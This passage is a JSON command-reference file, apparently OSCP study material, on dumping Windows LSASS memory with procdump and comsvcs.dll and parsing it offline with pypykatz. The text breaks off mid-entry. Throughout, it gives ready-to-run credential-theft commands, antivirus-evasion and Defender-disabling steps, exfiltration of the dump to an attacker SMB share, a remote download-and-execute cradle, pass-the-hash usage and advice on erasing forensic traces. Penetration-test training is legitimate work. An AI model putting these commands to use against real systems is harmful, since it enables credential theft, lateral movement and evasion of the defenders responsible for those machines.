{
  "metadata": {
    "file_purpose": "Mimikatz Alternative Tools - AV evasion techniques for LSASS credential extraction when Mimikatz.exe is blocked. Includes procdump, pypykatz, comsvcs.dll for offline/evasive credential harvesting.",
    "oscp_relevance": "HIGH - Windows Defender and AV solutions heavily signature Mimikatz. Alternatives enable credential harvesting in protected environments. Essential OSCP skill for real-world pentesting.",
    "educational_context": "Modern Windows environments (Windows 10+, Server 2016+) have Windows Defender enabled by default with Mimikatz signatures. Direct execution triggers immediate quarantine. Alternative approaches: (1) Dump LSASS memory using legitimate Microsoft tools (procdump, comsvcs.dll). (2) Transfer memory dump to attacker system. (3) Parse offline using pypykatz (Python) or Mimikatz on Kali. This bypasses on-target AV while achieving same credential extraction.",
    "prerequisites": [
      "Local Administrator privileges (required for LSASS memory access)",
      "SeDebugPrivilege (automatically granted to Administrators)",
      "LSASS process accessible (may be blocked by Credential Guard on modern systems)",
      "Procdump64.exe OR access to comsvcs.dll (built-in Windows DLL)"
    ],
    "related_techniques": [
      "Mimikatz sekurlsa::logonpasswords (direct approach)",
      "Task Manager LSASS dump (GUI alternative)",
      "Volume Shadow Copy credential extraction",
      "Nanodump (alternative LSASS dumper)"
    ],
    "attack_chain": [
      "1. Verify AV blocks Mimikatz.exe (expected on modern Windows)",
      "2. Upload procdump64.exe OR use built-in comsvcs.dll",
      "3. Dump LSASS process memory to .dmp file",
      "4. Download/exfiltrate .dmp file to Kali",
      "5. Parse dump offline with pypykatz lsa minidump lsass.dmp",
      "6. Extract credentials (NTLM hashes, plaintext passwords, Kerberos tickets)",
      "7. Use credentials for Pass-the-Hash or authentication"
    ],
    "detection_evasion": [
      "Procdump is Microsoft-signed legitimate debugging tool (low AV signature rate)",
      "Comsvcs.dll is Windows built-in DLL (completely legitimate)",
      "Offline parsing on Kali eliminates on-target Mimikatz execution",
      "LSASS dump appears as legitimate troubleshooting (procdump used for crash dumps)",
      "Pypykatz written in Python (not flagged by Windows Defender)"
    ]
  },
  "commands": [
    {
      "id": "procdump-lsass-dump",
      "name": "Procdump LSASS Memory Dump",
      "category": "post-exploit",
      "subcategory": "credential-harvesting",
      "os": "WINDOWS",
      "command": ".\\procdump64.exe -accepteula -ma lsass.exe lsass.dmp",
      "description": "Dump LSASS process memory using Microsoft Sysinternals procdump64.exe. Creates full memory dump containing credentials for offline parsing. Bypasses AV detection of Mimikatz by using legitimate Microsoft-signed debugging tool. Essential OSCP technique when Mimikatz.exe blocked.",
      "variables": [],
      "flag_explanations": {
        "procdump64.exe": "Microsoft Sysinternals legitimate debugging tool for creating process memory dumps. LEGITIMACY: Part of Sysinternals suite, Microsoft-signed binary, used by IT administrators for troubleshooting application crashes. WHY AV BYPASS: Procdump itself is benign - creates memory dumps for any process. Using it for LSASS is suspicious but not blocked by most AV. No credential extraction happens on target (only memory copy). Download from: https://docs.microsoft.com/en-us/sysinternals/downloads/procdump OR Evil-WinRM upload.",
        "-accepteula": "Auto-accept End User License Agreement (EULA). Suppresses interactive EULA prompt on first run. REQUIRED FOR AUTOMATION: Without this flag, procdump displays EULA popup requiring manual acceptance (breaks remote shells). Always include in command-line execution. Not required for subsequent runs (EULA acceptance persists in registry).",
        "-ma": "Full memory dump (include all accessible memory - kernel and user). ALTERNATIVE FLAGS: -mm (minimal dump - smaller file, may miss credentials). -ma is CRITICAL for credential extraction because LSASS credentials scattered throughout process memory. Minimal dumps may miss passwords in specific memory regions. OSCP TIP: Always use -ma for complete credential extraction. File size: 40-200MB depending on LSASS memory footprint.",
        "lsass.exe": "Target process name (Local Security Authority Subsystem Service). ALTERNATIVES: Use PID instead of name: procdump64.exe -ma <PID> lsass.dmp. Find LSASS PID: tasklist /fi \"imagename eq lsass.exe\" OR Get-Process lsass | Select-Object Id. Using PID prevents name confusion (only one lsass.exe, but explicit PID is clearer). Example: procdump64.exe -ma 612 lsass.dmp (if lsass PID = 612).",
        "lsass.dmp": "Output filename for memory dump. NAMING: Use descriptive names for multiple systems: <HOSTNAME>_lsass.dmp OR <IP>_lsass_<DATE>.dmp. Example: WEB01_lsass.dmp. LOCATION: Dumps to current working directory by default. Specify full path: C:\\Temp\\lsass.dmp. FILE SIZE: 40-200MB typically. OPSEC: Clean up dump file after download (del lsass.dmp) to remove forensic artifact."
      },
      "success_indicators": [
        "Output: 'Dump 1 initiated: <path>\\lsass.dmp' (dump started)",
        "Output: 'Dump 1 writing: Estimated dump file size is <size> MB' (in progress)",
        "Output: 'Dump 1 complete: <size> MB written in <seconds> seconds' (success)",
        "File created: dir lsass.dmp shows file size 40-200MB",
        "No error messages about access denied or process protection"
      ],
      "failure_indicators": [
        "ERROR: 'Error opening lsass.exe:' (insufficient privileges)",
        "ERROR: 'Access is denied' (not local administrator)",
        "ERROR: 'Error creating dump file' (path invalid or permissions issue)",
        "ERROR: 'The process cannot access the file' (file locked or in use)",
        "ERROR: 'Protected Process' (LSASS running as Protected Process Light - PPL)"
      ],
      "troubleshooting": {
        "Access is denied / Error opening lsass.exe": "Not running with local administrator privileges. Solution: Verify admin rights: whoami /groups | findstr Administrators. Must see 'BUILTIN\\Administrators' with 'Mandatory Label\\High Mandatory Level'. If using Evil-WinRM, ensure authenticated as local admin. Alternative: Use PsExec to get SYSTEM shell: PsExec.exe -s -i cmd.exe, then run procdump from SYSTEM context.",
        "Protected Process error": "LSASS running as Protected Process Light (PPL) or Credential Guard enabled. Detection: LSASS process has 'Protected' attribute (check with Process Explorer or Get-Process lsass | Select-Object Protection). Solution: (1) Disable PPL: Requires kernel driver (mimidrv.sys, PPLKiller) OR reboot to disable. (2) Use alternative: comsvcs.dll method (may bypass PPL in some configurations). (3) DCSync if Domain Admin available (avoids local LSASS). OSCP TIP: If Credential Guard enabled, pivot to registry dumps (SAM/LSA Secrets) or DCSync.",
        "Dump file size is 0 KB or very small": "Dump failed but didn't report error. Causes: (1) LSASS process terminated during dump. (2) Insufficient disk space. (3) Antivirus quarantined dump mid-creation. Solution: Verify disk space: dir C:\\ (check free space >500MB). Retry dump to different location: procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp. Check AV: Get-MpPreference | Select-Object DisableRealtimeMonitoring (should be True if disabled).",
        "Want to download dump but Evil-WinRM download slow": "LSASS dump 40-200MB, Evil-WinRM download can be slow over WAN. Alternative transfer methods: (1) SMB: Setup Impacket SMB server on Kali, copy from Windows: copy lsass.dmp \\\\<KALI_IP>\\share\\. (2) HTTP upload: Setup uploadserver on Kali, PowerShell upload from Windows. (3) Split file: Use 7zip to compress (lsass.7z ~10-30MB), then download. (4) FTP: Setup FTP server on Kali if other methods blocked. OSCP TIP: SMB copy is usually fastest for large files."
      },
      "prerequisites": [],
      "alternatives": [
        "comsvcs-lsass-dump",
        "mimikatz-sekurlsa-logonpasswords"
      ],
      "next_steps": [
        "pypykatz-parse-lsass",
        "evil-winrm-download-file"
      ],
      "tags": [
        "OSCP:HIGH",
        "PROCDUMP",
        "LSASS_DUMP",
        "CREDENTIAL_HARVESTING",
        "AV_EVASION",
        "SYSINTERNALS",
        "NTLM_HASH",
        "OFFLINE_PARSING",
        "ACTIVE_DIRECTORY",
        "POST_EXPLOITATION",
        "WINDOWS"
      ],
      "oscp_relevance": "high",
      "notes": "OSCP METHODOLOGY: Procdump is ESSENTIAL for OSCP when Windows Defender enabled (default on modern Windows). CRITICAL WORKFLOW: (1) Upload procdump64.exe to target. (2) Dump LSASS memory. (3) Download dump to Kali. (4) Parse offline with pypykatz. This bypasses all on-target AV while achieving same credential extraction as Mimikatz.\n\nTIME ESTIMATE: 2-5 minutes total (30 sec upload procdump, 30-60 sec dump LSASS, 2-4 min download 40-200MB dump, 30 sec parse)\n\nMANUAL ALTERNATIVES:\n1. Task Manager dump (GUI):\n   - Open Task Manager (Ctrl+Shift+Esc)\n   - Details tab → Right-click lsass.exe → Create dump file\n   - Dump saved to C:\\Users\\<USER>\\AppData\\Local\\Temp\\lsass.DMP\n   - Advantage: No tool upload, built-in Windows feature\n   - Disadvantage: Requires GUI access (RDP), not scriptable\n\n2. Comsvcs.dll (no upload required):\n   - See comsvcs-lsass-dump command\n   - Uses built-in Windows DLL\n   - rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> lsass.dmp full\n\n3. Nanodump (alternative to procdump):\n   - Modern C alternative, smaller binary (~60KB vs 500KB)\n   - nanodump.exe --write lsass.dmp\n\nPROCDUMP VS MIMIKATZ DIRECT:\nProcdump + Offline Parsing:\n  - Pros: Bypasses AV (Microsoft-signed), legitimate tool, no Mimikatz on target\n  - Cons: Requires dump transfer (40-200MB), two-step process, offline parsing needed\n  - Detection: Low (legitimate debugging activity)\n  - OSCP Use: DEFAULT method when AV present\n\nMimikatz Direct:\n  - Pros: One-step extraction, instant results, no file transfer\n  - Cons: Heavily signatured (blocked by Defender), suspicious binary\n  - Detection: High (immediate AV alert)\n  - OSCP Use: Only when AV disabled or obfuscated Mimikatz available\n\nOSCP EXAM TIPS:\n1. Test Windows Defender status FIRST: Get-MpPreference | Select-Object DisableRealtimeMonitoring\n2. If True (disabled): Use Mimikatz directly (faster)\n3. If False (enabled): Use procdump + offline parsing (AV bypass)\n4. Upload procdump64.exe to C:\\Windows\\Temp\\ or C:\\ProgramData\\ (common writable paths)\n5. Dump to same directory for easy cleanup: .\\procdump64.exe -accepteula -ma lsass.exe .\\lsass.dmp\n6. Download dump immediately (don't leave 200MB artifact on target)\n7. Delete dump after download: del lsass.dmp (cleanup)\n8. Parse on Kali: pypykatz lsa minidump lsass.dmp > creds.txt\n\nFILE TRANSFER STRATEGIES:\n1. Evil-WinRM (default): download lsass.dmp (40-200MB, may be slow)\n2. SMB (fastest for large files):\n   Kali: impacket-smbserver share . -smb2support\n   Windows: copy lsass.dmp \\\\<KALI_IP>\\share\\\n3. Compress first (reduce size 70-80%):\n   Windows: Compress-Archive lsass.dmp lsass.zip\n   Download: download lsass.zip (10-40MB, much faster)\n   Kali: unzip lsass.zip && pypykatz lsa minidump lsass.dmp\n\nDETECTION NOTES:\n- Event ID 4656: Handle to process (may log LSASS access if auditing enabled)\n- Event ID 4663: Object access attempt (process memory read)\n- Procdump execution visible in Event ID 4688 (process creation) if logging enabled\n- LSASS memory dump is SIEM alert trigger in mature environments\n- Dump file on disk is forensic artifact (delete after download)\n- Offline parsing on Kali generates no target system events\n\nCOMMON MISTAKES:\n1. Using -mm (minimal) instead of -ma (full) - misses credentials\n2. Not using -accepteula - causes interactive prompt in remote shell (hangs)\n3. Leaving dump file on target after extraction (forensic evidence)\n4. Attempting download without compressing (slow for 200MB file)\n5. Not checking LSASS PID first (using wrong PID)\n6. Dumping to non-writable directory (C:\\ requires admin, use C:\\Temp or C:\\Windows\\Temp)\n\nADVANCED USAGE:\n- Dump by PID: tasklist /fi \"imagename eq lsass.exe\" → procdump64.exe -accepteula -ma <PID> lsass.dmp\n- Multiple dumps: procdump64.exe -accepteula -ma -n 3 lsass.exe lsass.dmp (3 dumps for analysis)\n- Compress on target: procdump64.exe -ma lsass.exe - | 7z a -si lsass.7z (pipe to 7zip)\n- Remote dump via PsExec: PsExec.exe \\\\<TARGET> -s procdump64.exe -accepteula -ma lsass.exe C:\\lsass.dmp\n\nCREDENTIAL GUARD WORKAROUNDS:\nIf Credential Guard enabled (blocks LSASS memory access):\n1. DCSync (if Domain Admin): Extract credentials from Domain Controller instead\n2. SAM/LSA Secrets: Use lsadump::sam and lsadump::secrets (registry-based, not memory)\n3. Kerberos tickets: Extract tickets (may still work with Credential Guard)\n4. Pass-the-Hash: Use NTLM hashes without plaintext (PtH attacks still viable)\n5. Kerberoasting: Extract service account hashes (doesn't touch LSASS)"
    },
    {
      "id": "pypykatz-parse-lsass",
      "name": "Pypykatz Parse LSASS Dump Offline",
      "category": "post-exploit",
      "subcategory": "credential-harvesting",
      "os": "LINUX",
      "command": "pypykatz lsa minidump lsass.dmp",
      "description": "Parse LSASS memory dump offline on Kali using pypykatz (Python-based Mimikatz alternative). Extracts NTLM hashes, plaintext passwords, Kerberos tickets from procdump/comsvcs dump files. Pure Python implementation (no Wine/Windows required). Essential for offline credential analysis.",
      "variables": [],
      "flag_explanations": {
        "pypykatz": "Python implementation of Mimikatz credential extraction functionality. ADVANTAGES: (1) Runs natively on Linux (Kali, Ubuntu, etc.) without Wine or Windows VM. (2) Not flagged by Windows Defender (never executes on target). (3) Open-source, auditable code. (4) Actively maintained by SkelSec. INSTALLATION: Kali default (sudo apt install pypykatz) OR pip3 install pypykatz. CAPABILITIES: Parses LSASS dumps, SAM/LSA registry hives, Kerberos ccache files. Equivalent to Mimikatz sekurlsa::logonpasswords for offline analysis.",
        "lsa minidump": "Subcommand for parsing LSA (LSASS) memory dumps. 'lsa' module = Local Security Authority credential extraction. 'minidump' format = Windows MiniDump format (.dmp files from procdump, Task Manager, comsvcs.dll). WHY MINIDUMP: Windows crash dumps and process dumps use standardized MiniDump format containing full or partial process memory. Pypykatz reads this format to extract credential structures (Kerberos, NTLM, WDigest, CredSSP, etc.) same as Mimikatz on Windows.",
        "lsass.dmp": "Path to LSASS memory dump file created by procdump/comsvcs. TRANSFER FROM TARGET: Use Evil-WinRM 'download lsass.dmp', SMB copy, HTTP upload, or compress+download. FILE SIZE: 40-200MB typical. LOCATION: Can be anywhere on Kali filesystem. Example paths: ~/loot/target1/lsass.dmp, /tmp/lsass.dmp. MULTIPLE DUMPS: Parse each separately or use wildcards: pypykatz lsa minidump *.dmp",
        "Output Format": "Pypykatz output shows: (1) AUTHENTICATION PACKAGES: msv (NTLM), kerberos (tickets), wdigest (plaintext if enabled), tspkg (RDP), ssp (NTLM), livessp (Microsoft accounts). (2) LOGON SESSIONS: SID, logontype (Interactive, Service, Network), username, domainname. (3) CREDENTIALS: NTLM hash (32 hex chars), Plaintext password (if cached), SHA1 hash. (4) KERBEROS TICKETS: TGT/TGS tickets, lifetimes, encryption types. Output identical to Mimikatz sekurlsa::logonpasswords but parsed offline."
      },
      "success_indicators": [
        "Output: 'Parsing file lsass.dmp' (file opened successfully)",
        "Output: 'username <username>' and 'domainname <DOMAIN>' (session found)",
        "Output: 'NT: <32-character hex hash>' (NTLM hash extracted)",
        "Output: 'password <plaintext>' (plaintext password if cached)",
        "Output: 'kerberos tickets' section (Kerberos TGT/TGS if present)",
        "Multiple sessions displayed (different users logged in at dump time)"
      ],
      "failure_indicators": [
        "ERROR: 'File not found' (dump file path incorrect)",
        "ERROR: 'Not a valid minidump file' (corrupted dump or wrong format)",
        "ERROR: 'Module not found: pypykatz' (pypykatz not installed)",
        "Empty output / No credentials (dump file valid but no credentials cached)",
        "ERROR: 'Permission denied' (file permissions issue on Kali)"
      ],
      "troubleshooting": {
        "Module not found: pypykatz": "Pypykatz not installed on Kali. Solution: Install with: sudo apt update && sudo apt install pypykatz -y OR pip3 install pypykatz --user. Verify installation: pypykatz --help (should display usage). Kali 2022+ includes pypykatz by default. Older Kali: use pip3 method.",
        "Not a valid minidump file": "Dump file corrupted during transfer or created incorrectly. Causes: (1) Incomplete download (file transfer interrupted). Solution: Verify file size on Windows matches Kali: Windows: dir lsass.dmp, Kali: ls -lh lsass.dmp. Re-download if mismatch. (2) Wrong dump type (not full memory dump). Solution: Ensure procdump used -ma flag (full dump), not -mm (minimal). (3) File corruption. Solution: Re-create dump on target, transfer again with integrity check (MD5/SHA256).",
        "No credentials displayed / Empty output": "Dump is valid but contains no credentials. Causes: (1) No users were logged in at dump time (only SYSTEM). Solution: Normal for servers with only service logons. Check domainname field - if all entries show 'NT AUTHORITY', no domain users were active. (2) Credential Guard enabled (blocks credential caching). Solution: Credentials protected, pypykatz shows sessions but no passwords/hashes. Pivot to DCSync or registry dumps. (3) Dump created from wrong process. Solution: Verify dump is from lsass.exe (PID 600-800 typical), not another process.",
        "Want JSON output for automation": "Pypykatz supports JSON format for scripting. Command: pypykatz lsa minidump lsass.dmp -o json > creds.json. Parse JSON with jq: jq '.logon_sessions[].msv_creds[].NThash' creds.json (extract NTLM hashes). Alternative formats: -o grep (grep-friendly), -o none (suppress output, useful with --outfile)."
      },
      "prerequisites": [
        "procdump-lsass-dump",
        "comsvcs-lsass-dump"
      ],
      "alternatives": [
        "mimikatz-sekurlsa-logonpasswords"
      ],
      "next_steps": [
        "hashcat-crack-ntlm",
        "pth-cme-exec"
      ],
      "tags": [
        "OSCP:HIGH",
        "PYPYKATZ",
        "LSASS_PARSING",
        "CREDENTIAL_HARVESTING",
        "OFFLINE_ANALYSIS",
        "NTLM_HASH",
        "PLAINTEXT_PASSWORD",
        "KERBEROS",
        "LINUX",
        "KALI",
        "PYTHON",
        "ACTIVE_DIRECTORY",
        "POST_EXPLOITATION"
      ],
      "oscp_relevance": "high",
      "notes": "OSCP METHODOLOGY: Pypykatz is the STANDARD tool for parsing LSASS dumps on Kali. CRITICAL WORKFLOW: Windows (procdump) → Transfer dump to Kali → Parse with pypykatz → Extract credentials. This is the most OPSEC-friendly approach for credential harvesting.\n\nTIME ESTIMATE: 10-30 seconds (5-10 sec file parsing, 5-20 sec analyzing output)\n\nMANUAL ALTERNATIVES:\n1. Mimikatz on Windows (parse dump on Windows VM):\n   mimikatz # sekurlsa::minidump lsass.dmp\n   mimikatz # sekurlsa::logonpasswords\n   Advantage: Official Mimikatz (100% compatible)\n   Disadvantage: Requires Windows VM or Wine (complex setup)\n\n2. Invoke-Mimikatz PowerShell (remote parsing):\n   IEX (New-Object Net.WebClient).DownloadString('Invoke-Mimikatz.ps1')\n   Invoke-Mimikatz -DumpFilePath lsass.dmp\n   Advantage: Parse on Windows without Mimikatz.exe\n   Disadvantage: Requires PowerShell, larger footprint\n\n3. Impacket secretsdump (for registry hives, not LSASS dumps):\n   impacket-secretsdump -sam sam.save -system system.save LOCAL\n   Note: Different use case (registry files, not memory dumps)\n\nPYPYKATZ VS MIMIKATZ:\nPypykatz (Linux):\n  - Pros: Native Linux, no AV issues, offline analysis, open-source\n  - Cons: Occasional parsing differences, may miss some credential types\n  - OSCP Use: DEFAULT for offline dump parsing\n\nMimikatz (Windows):\n  - Pros: Official tool, 100% compatibility, all features\n  - Cons: Requires Windows/Wine, AV signatures, more complex setup\n  - OSCP Use: Direct on-target extraction (if AV disabled)\n\nOSCP EXAM TIPS:\n1. Parse dumps immediately after download (verify credentials before cleanup)\n2. Save output to file: pypykatz lsa minidump lsass.dmp > creds.txt (reference later)\n3. Look for Domain Admin sessions: grep -i \"domain admins\" creds.txt\n4. Extract NTLM hashes for Pass-the-Hash: grep \"NT:\" creds.txt | sort -u\n5. Check for plaintext passwords: grep \"password\" creds.txt (WDigest on old systems)\n6. Parse multiple dumps: for f in *.dmp; do pypykatz lsa minidump $f >> all_creds.txt; done\n7. Organize by system: mkdir creds && pypykatz lsa minidump WEB01_lsass.dmp > creds/WEB01.txt\n\nCREDENTIAL EXTRACTION WORKFLOW:\n1. Download LSASS dump to Kali: Evil-WinRM → download lsass.dmp\n2. Parse with pypykatz: pypykatz lsa minidump lsass.dmp | tee creds.txt\n3. Extract NTLM hashes: grep \"NT:\" creds.txt | awk '{print $2}' | sort -u > ntlm_hashes.txt\n4. Extract usernames: grep \"username\" creds.txt | awk '{print $2}' | sort -u > users.txt\n5. Extract domains: grep \"domainname\" creds.txt | awk '{print $2}' | sort -u > domains.txt\n6. Create user:hash pairs: paste -d: users.txt ntlm_hashes.txt > user_hash_pairs.txt\n7. Pass-the-Hash: crackmapexec smb <TARGETS> -u users.txt -H ntlm_hashes.txt --no-bruteforce\n\nOUTPUT INTERPRETATION:\n=== AUTHENTICATION PACKAGES ===\nmsv:\n  - Contains NTLM hashes (LM and NT)\n  - Example: NT: 8846f7eaee8fb117ad06bdd830b7586c\n  - Use for Pass-the-Hash attacks\n\nkerberos:\n  - Kerberos tickets (TGT/TGS)\n  - Ticket lifetimes, encryption types, service principals\n  - Export tickets for Pass-the-Ticket\n\nwdigest:\n  - Plaintext passwords (if WDigest enabled)\n  - Disabled by default on Windows 8.1+/2012 R2+\n  - If found, immediate win (plaintext domain passwords)\n\ntspkg:\n  - RDP/TS credentials\n  - Usually same as msv (NTLM hashes)\n\n=== LOGON SESSIONS ===\nlogon_id: Unique session identifier (LUID)\nlogontype: Interactive (2), Service (5), Network (3), RemoteInteractive (10/RDP)\nusername: Account name\ndomainname: Domain or WORKGROUP for local\n\nPRIORITY TARGETS:\nHIGH VALUE FINDS:\n1. Domain Admin credentials: domainname = <DOMAIN>, username in 'Domain Admins' group\n2. Service account plaintext: High-privilege service accounts (sql_service, backup_admin)\n3. Multiple domain users: Lateral movement opportunities\n4. Kerberos TGT: Pass-the-Ticket for any service\n\nDETECTION NOTES:\n- Pypykatz parsing on Kali generates ZERO events on target system (100% offline)\n- No network traffic to target during parsing\n- OPSEC ADVANTAGE: All analysis happens on attacker infrastructure\n- Target only sees: LSASS dump creation (procdump execution) + file download (if monitored)\n\nCOMMON MISTAKES:\n1. Not saving pypykatz output (re-parsing large dumps is slow)\n2. Parsing wrong file (ensure lsass.dmp, not other process dump)\n3. Not organizing multi-system dumps (label by hostname/IP)\n4. Missing plaintext passwords in output (WDigest section - rare but high value)\n5. Not extracting Kerberos tickets (can be exported for Pass-the-Ticket)\n\nADVANCED USAGE:\n- Batch parsing: for dump in *.dmp; do echo \"=== $dump ===\"; pypykatz lsa minidump $dump; done > all.txt\n- JSON output: pypykatz lsa minidump lsass.dmp -o json | jq '.logon_sessions' > sessions.json\n- Kerberos ticket export: pypykatz lsa minidump lsass.dmp --kerberos-dir ./tickets/\n- Registry parsing: pypykatz registry --sam sam.save --system system.save\n- Recursive parsing: pypykatz lsa minidump lsass.dmp --packages all (all auth packages)\n\nCOMPATIBILITY NOTES:\n- Works with dumps from: procdump, Task Manager, comsvcs.dll, Process Hacker, nanodump\n- Supports all Windows versions: XP through Windows 11, Server 2003 through 2022\n- Parses both 32-bit and 64-bit dumps\n- Occasional issues with very old dumps (pre-Windows 7) - use Mimikatz fallback"
    },
    {
      "id": "comsvcs-lsass-dump",
      "name": "Comsvcs.dll LSASS Dump (No Tool Upload)",
      "category": "post-exploit",
      "subcategory": "credential-harvesting",
      "os": "WINDOWS",
      "command": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\Temp\\lsass.dmp full",
      "description": "Dump LSASS memory using Windows built-in comsvcs.dll DLL via rundll32. No tool upload required (completely native Windows technique). Creates full LSASS memory dump identical to procdump. Excellent AV evasion because comsvcs.dll is legitimate Windows component for COM+ Services debugging.",
      "variables": [
        {
          "name": "<LSASS_PID>",
          "description": "Process ID of lsass.exe (find with tasklist or Get-Process)",
          "example": "612",
          "required": true,
          "common_values": [
            "612",
            "608",
            "664"
          ]
        }
      ],
      "flag_explanations": {
        "rundll32.exe": "Windows utility for executing DLL functions from command line. LEGITIMACY: Built-in Windows binary (C:\\Windows\\System32\\rundll32.exe), used by Windows for legitimate purposes (Control Panel applets, Windows features). WHY FOR LSASS DUMP: rundll32 can call MiniDump export function from comsvcs.dll, which creates process memory dumps. LOLBIN STATUS: rundll32 is a Living Off The Land Binary - legitimate Windows binary abused for offensive purposes.",
        "comsvcs.dll": "Windows DLL for COM+ Services (Component Services). LOCATION: C:\\Windows\\System32\\comsvcs.dll (exists on all Windows versions). FUNCTIONALITY: Contains MiniDump export function designed for creating crash dumps of COM+ applications. ABUSE: MiniDump function works on ANY process, including lsass.exe. WHY AV EVASION: Legitimate Windows DLL (Microsoft-signed), not flagged by AV. Defenders expect COM+ debugging, not LSASS credential theft.",
        "MiniDump": "Export function within comsvcs.dll that creates memory dumps. FUNCTIONALITY: Identical to procdump -ma (full memory dump). Creates .dmp file containing full process memory for specified PID. PARAMETERS: MiniDump <PID> <OutputFile> <DumpType>. DumpType 'full' = complete memory dump (equivalent to procdump -ma). Alternative: 'normal' for smaller dump (may miss credentials - not recommended).",
        "<LSASS_PID>": "Process ID of lsass.exe to dump. FIND PID: tasklist /fi \"imagename eq lsass.exe\" (shows PID in second column) OR Get-Process lsass | Select-Object Id OR wmic process where name='lsass.exe' get ProcessId. TYPICAL RANGE: 600-800 on most systems (LSASS starts early in boot). CRITICAL: Use exact PID, wrong PID dumps wrong process (no credentials).",
        "C:\\Temp\\lsass.dmp": "Output path for memory dump. LOCATION: Must be writable by current user. Recommended paths: C:\\Windows\\Temp\\, C:\\Temp\\ (create if needed: mkdir C:\\Temp), C:\\Users\\<USER>\\AppData\\Local\\Temp\\. FILE SIZE: 40-200MB (same as procdump). OPSEC: Use inconspicuous filename or temp location. Example: C:\\Windows\\Temp\\debug.dmp (blends with legitimate crash dumps).",
        "full": "Dump type parameter for MiniDump function. OPTIONS: 'full' = complete memory dump with all process data (REQUIRED for credential extraction). 'normal' = smaller dump, may miss credential memory regions (NOT recommended). 'mini' = minimal dump, insufficient for credentials. CRITICAL: Always use 'full' for LSASS dumps to ensure all credentials captured."
      },
      "success_indicators": [
        "No error output (success is silent)",
        "File created: dir C:\\Temp\\lsass.dmp shows 40-200MB file",
        "File timestamp matches execution time (recent creation)",
        "rundll32.exe process completes and exits (check with: tasklist /fi \"imagename eq rundll32.exe\")",
        "Dump file is valid: Can be parsed by pypykatz or Mimikatz on Kali"
      ],
      "failure_indicators": [
        "ERROR: Access is denied (insufficient privileges)",
        "ERROR: The process cannot access the file (path invalid or locked)",
        "ERROR: Invalid parameter (wrong syntax or PID)",
        "File size is 0 KB or very small (dump failed)",
        "No file created at specified path (complete failure)"
      ],
      "troubleshooting": {
        "Access is denied": "Not running with local administrator privileges OR LSASS protected. Solution: Verify admin: whoami /groups | findstr Administrators. Ensure 'High Mandatory Level' shown. If LSASS protected (Credential Guard/PPL): comsvcs.dll may still fail. Alternative: Use procdump with PPL bypass OR DCSync if Domain Admin available.",
        "Invalid parameter / Syntax error": "Command syntax incorrect or PID wrong. CORRECT SYNTAX: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> <PATH> full. Note COMMA after comsvcs.dll (required). VERIFY PID: tasklist /fi \"imagename eq lsass.exe\" - use PID exactly as shown. COMMON MISTAKE: Missing comma, wrong path separators, quotes around path (not needed unless spaces).",
        "File created but size is 0 KB or very small": "Dump failed mid-execution or insufficient permissions. Causes: (1) Disk space full. Solution: Check free space: dir C:\\ - need >500MB free. (2) AV quarantined dump during creation. Solution: Disable AV: Set-MpPreference -DisableRealtimeMonitoring $true. (3) LSASS terminated during dump. Solution: Rare - retry dump. VERIFY: Re-run with verbose error redirection: rundll32 ... 2>&1 | Out-File error.txt.",
        "Want to use without knowing PID": "Must have PID for comsvcs.dll method (required parameter). Solution: Get PID first, then run dump in one line: PowerShell: $pid=(Get-Process lsass).Id; rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump $pid C:\\Temp\\lsass.dmp full. CMD: for /f \"tokens=2\" %i in ('tasklist /fi \"imagename eq lsass.exe\"') do rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump %i C:\\Temp\\lsass.dmp full (complex but works)."
      },
      "prerequisites": [],
      "alternatives": [
        "procdump-lsass-dump",
        "mimikatz-sekurlsa-logonpasswords"
      ],
      "next_steps": [
        "pypykatz-parse-lsass",
        "evil-winrm-download-file"
      ],
      "tags": [
        "OSCP:HIGH",
        "COMSVCS",
        "RUNDLL32",
        "LSASS_DUMP",
        "CREDENTIAL_HARVESTING",
        "AV_EVASION",
        "LOLBIN",
        "NO_UPLOAD",
        "NTLM_HASH",
        "ACTIVE_DIRECTORY",
        "POST_EXPLOITATION",
        "WINDOWS"
      ],
      "oscp_relevance": "high",
      "notes": "OSCP METHODOLOGY: Comsvcs.dll technique is CRITICAL for OSCP when you cannot upload tools. ADVANTAGE: 100% native Windows technique using built-in DLL and rundll32. No binary upload = no AV signature detection. Identical dump quality to procdump.\n\nTIME ESTIMATE: 30-60 seconds (10 sec find PID, 10 sec execute dump, 10-40 sec verify file created)\n\nMANUAL ALTERNATIVES:\n1. Procdump (requires upload):\n   procdump64.exe -accepteula -ma lsass.exe lsass.dmp\n   Advantage: Simpler syntax, better error messages\n   Disadvantage: Requires tool upload (AV may flag)\n\n2. Task Manager dump (requires GUI):\n   Task Manager → Details → lsass.exe → Right-click → Create dump file\n   Advantage: Point-and-click, no command line\n   Disadvantage: Requires RDP access, not scriptable\n\n3. PowerShell MiniDump (custom code):\n   Use .NET MiniDumpWriteDump API directly from PowerShell\n   Advantage: No tool, pure PowerShell\n   Disadvantage: Complex code, may be flagged by AMSI\n\nCOMSVCS VS PROCDUMP:\nComsvcs.dll:\n  - Pros: No upload, built-in Windows, low AV detection, LOLBIN technique\n  - Cons: Requires PID lookup, syntax less intuitive, limited error messages\n  - OSCP Use: DEFAULT when tool upload not possible or AV enabled\n\nProcdump:\n  - Pros: Better syntax, clear errors, Microsoft-signed, accepts process name\n  - Cons: Requires upload (500KB binary), may trigger AV upload detection\n  - OSCP Use: When tool upload accepted and verified clean\n\nOSCP EXAM TIPS:\n1. Comsvcs is PREFERRED when Evil-WinRM/shell available but no upload possible\n2. One-liner with PID lookup: for /f \"tokens=2\" %i in ('tasklist /fi \"imagename eq lsass.exe\"') do @echo PID: %i (get PID) then use PID in command\n3. PowerShell one-liner (cleaner): $p=(Get-Process lsass).Id; rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump $p C:\\Temp\\lsass.dmp full\n4. Create output directory first: mkdir C:\\Temp (if doesn't exist)\n5. Verify dump size after creation: dir C:\\Temp\\lsass.dmp (should be 40-200MB)\n6. Download immediately: Evil-WinRM → download C:\\Temp\\lsass.dmp\n7. Delete dump after download: del C:\\Temp\\lsass.dmp (cleanup)\n8. Parse on Kali: pypykatz lsa minidump lsass.dmp\n\nCOMPLETE ATTACK WORKFLOW:\n1. Gain shell on Windows target (Evil-WinRM, web shell, reverse 